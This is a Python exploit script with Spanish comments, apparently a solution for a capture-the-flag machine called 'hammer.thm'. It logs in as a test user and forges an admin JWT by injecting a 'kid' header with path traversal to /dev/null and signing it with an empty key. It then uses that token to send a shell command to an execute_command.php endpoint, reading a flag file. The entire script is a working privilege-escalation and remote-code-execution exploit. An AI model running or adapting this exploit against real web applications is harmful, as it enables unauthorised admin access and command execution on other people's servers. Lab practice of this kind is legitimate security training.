import requests
import json
import hmac
import hashlib
import base64
import sys
import time
import re

# --- ⚙️ CONFIGURACIÓN ---
TARGET_IP = "10.81.136.11" 
TARGET_PORT = "1337"
BASE_URL = f"http://{TARGET_IP}:{TARGET_PORT}"

# Credenciales
EMAIL = "tester@hammer.thm"
PASSWORD = "1234"

# Headers para simular navegador real
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/index.php"
}

def base64url_encode(input_bytes):
    return base64.urlsafe_b64encode(input_bytes).decode('utf-8').rstrip('=')

def login():
    """Paso 1: Login en index.php"""
    url = f"{BASE_URL}/index.php"
    print(f"[*] Conectando a {url} para obtener token legítimo...")

    # Datos como formulario normal
    data = {
        "email": EMAIL,
        "password": PASSWORD
    }
    
    # Sesión para guardar cookies
    s = requests.Session()
    
    try:
        # Petición POST (Login)
        resp = s.post(url, data=data, headers=HEADERS, timeout=10)
        
        # 1. Buscar en cookies
        token = s.cookies.get('token')
        
        # 2. Si no, buscar patrón JWT en el texto (por si viene en un script JS)
        if not token:
            match = re.search(r'eyJ[a-zA-Z0-9\-_]+\.eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+', resp.text)
            if match:
                token = match.group(0)

        if token:
            print(f"[+] Login Exitoso.")
            print(f"    Token Original (User): {token[:30]}...{token[-10:]}")
            return token
        else:
            print(f"[-] No se encontró token. Status: {resp.status_code}")
            # Si redirige al dashboard, quizás la cookie se llama diferente
            if "dashboard" in resp.url:
                print("    (!) Redirigido a dashboard, revisando cookies:", s.cookies.get_dict())
            sys.exit(1)

    except Exception as e:
        print(f"[!] Error de conexión: {e}")
        sys.exit(1)

def forge_token(original_token):
    """Paso 2: Modificar el token (Privilege Escalation)"""
    print(f"[*] Forjando Token Admin (KID Injection)...")
    
    # Header Malicioso: Directory Traversal a /dev/null
    header = {
        "typ": "JWT",
        "alg": "HS256",
        "kid": "../../../../../../../dev/null" 
    }

    # Payload Admin
    payload = {
        "iss": "http://hammer.thm",
        "aud": "http://hammer.thm",
        "iat": int(time.time()), 
        "exp": int(time.time()) + 3600,
        "data": {
            "user_id": 1,
            "email": EMAIL,
            "role": "admin" # <--- Objetivo
        }
    }

    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))

    # Firmar con vacío (b'')
    msg = f"{header_b64}.{payload_b64}".encode('utf-8')
    signature = hmac.new(b'', msg, hashlib.sha256).digest()
    signature_b64 = base64url_encode(signature)

    new_token = f"{header_b64}.{payload_b64}.{signature_b64}"
    
    print(f"    Token Forjado (Admin): {new_token[:30]}...{new_token[-10:]}")
    return new_token

def exploit(token, command):
    """Paso 3: Ejecutar comando"""
    print(f"[*] Enviando comando: {command}")
    url = f"{BASE_URL}/execute_command.php"
    
    # Headers para RCE (aquí sí suele ser JSON)
    headers_rce = HEADERS.copy()
    headers_rce["Content-Type"] = "application/json"
    headers_rce["Authorization"] = f"Bearer {token}"
    
    cookies = {'token': token}
    data = {"command": command}
    
    try:
        resp = requests.post(url, json=data, cookies=cookies, headers=headers_rce, timeout=10)
        
        if "<title>Login</title>" in resp.text:
            print(f"[-] FALLO: El servidor rechazó el token Admin (Vuelta al login).")
        elif resp.status_code == 200:
            try:
                output = resp.json().get('output', resp.text)
                print(f"\n{'-'*40}")
                print(f"🔥 FLAG ENCONTRADA:\n{output.strip()}")
                print(f"{'-'*40}\n")
            except:
                print(f"[+] Output Raw:\n{resp.text}")
        else:
            print(f"[-] Error HTTP {resp.status_code}")

    except Exception as e:
        print(f"[!] Error explotando: {e}")

if __name__ == "__main__":
    # Flujo completo
    real_token = login()
    admin_token = forge_token(real_token)
    
    # Comando final
    cmd = "cat /home/ubuntu/flag.txt"
    exploit(admin_token, cmd)